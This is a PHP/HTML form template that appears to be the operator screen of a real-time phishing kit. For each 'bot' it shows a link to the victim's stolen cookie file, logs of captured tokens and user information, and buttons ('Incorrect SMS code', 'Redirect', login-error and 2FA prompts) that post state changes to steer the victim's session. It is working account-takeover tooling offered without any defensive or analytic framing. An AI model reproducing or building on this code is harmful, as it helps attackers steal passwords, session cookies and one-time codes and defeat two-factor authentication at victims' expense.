<fieldset>
    <div class="form-group">

    <label for="datalog">Data Info</label>

    <textarea name="datalog" placeholder="Info" class="form-control" id="datalog" style="height:150px; "><?php echo htmlspecialchars(($edit) ? $customer['datalog'] : '', ENT_QUOTES, 'UTF-8'); ?></textarea>


<div id="cookie_frm" style="padding-top:10px;display:none;">
    <a target="_blank" class="btn btn-warning" href="data/<?php echo htmlspecialchars(($edit) ? $customer['botid'] : '', ENT_QUOTES, 'UTF-8'); ?>.json">Cookie<i class="glyphicon glyphicon-send"></i></a>
</div>

<script>
  if (document.getElementById('cookie_frm').innerHTML.indexOf('0.json') ==-1)
  document.getElementById('cookie_frm').style.display='';

  <?php

  $fls=($edit) ? $customer['botid'] : '';

  $fls='data/'.$fls.'.json';

  if(@fopen($fls, "r"))
   {
  		echo "document.getElementById('cookie_frm').style.display='';";
   }
   else {
     echo  "document.getElementById('cookie_frm').style.display='none';";
   }

  ?>
</script>



    </div>

    <div id="btngroup" class="form-group">
    <label for="tokenlog">Token log</label>

    <style>
.btnw
{
width:200px;
}

.divpd
{
padding-top:10px;
}
    </style>

    <textarea name="tokenlog" placeholder="" class="form-control" id="tokenlog" style="height:180px; "><?php echo htmlspecialchars(($edit) ? $customer['tokenlog'] : '', ENT_QUOTES, 'UTF-8'); ?></textarea>
    <input type="hidden" id="tokenstate" name="tokenstate" value="">

    <div  class="divpd" align="center">    
      <button  id="incorrect2fa_btn" class="btnw btn btn-warning" >Incorrect SMS code <i class="glyphicon glyphicon-send"></i></button>
      <button  id="redirect_btn" class="btnw btn btn-warning" >Redirect <i class="glyphicon glyphicon-send"></i></button>
    </div>




    </div>

    <script>

    function errloginpassfunc ()
    {

      $('#tokenstate').val('[ERRLOGIN]');
      $('#tokenlog').val('>>Error login/password\r\n'+ $('#tokenlog').val());
      control_post();
      return false;
    }

    function twofactauthfunc ()
    {
      $('#tokenstate').val('[2FA]');
      $('#tokenlog').val('>>2FA  request\r\n'+ $('#tokenlog').val());
      control_post();
      return false
    }



    function incorrect2fa_func ()
    {
      $('#tokenstate').val('[2FAINCORRECT]');
      $('#tokenlog').val('>>2FA code error\r\n'+ $('#tokenlog').val());
      control_post();
      return false
    }

    function redirect_func ()
    {
      $('#tokenstate').val('[REDIRECT]');
      $('#tokenlog').val('>>REDIRECT\r\n'+ $('#tokenlog').val());
      control_post();
      return false
    }



    function control_post() {
    var s_url=document.location.href;
    var  datalog=  $('#datalog').val();
    var  tokenlog=  $('#tokenlog').val();
    var  tokenstate=  $('#tokenstate').val();
    var  userinformation= $('#userinformation').val();
    var  comment= $('#comment').val();
    $.post(s_url, { datalog: datalog, tokenlog: tokenlog,  tokenstate: tokenstate,  userinformation: userinformation, comment: comment} );
      return false;
  }

    $("#customer_form").ready(function()
     {

          $('#errloginpass_btn').click(function(){ errloginpassfunc(); return false;  });
          $('#twofactauth_btn').click(function(){ twofactauthfunc();return false;});

          $('#incorrect2fa_btn').click(function(){ incorrect2fa_func();  return false; });
          $('#redirect_btn').click(function(){ redirect_func();  return false; });


       });

    </script>



    <div class="form-group">
        <label for="userinformation">User info</label>

 <textarea name="userinformation" placeholder="" class="form-control" id="userinformation" style="height:537px; "><?php echo htmlspecialchars(($edit) ? $customer['userinformation'] : '', ENT_QUOTES, 'UTF-8'); ?></textarea>

             </div>








    <div class="form-group">
        <label for="comment">Comment</label>
        <input name="comment" value="<?php echo htmlspecialchars($edit ? $customer['comment'] : '', ENT_QUOTES, 'UTF-8'); ?>" placeholder="" class="form-control"  type="text" id="comment">
    </div>




    <div class="form-group text-center">
        <label></label>
        <button type="submit" class="btn btn-warning" >Save <i class="glyphicon glyphicon-send"></i></button>
    </div>
</fieldset>
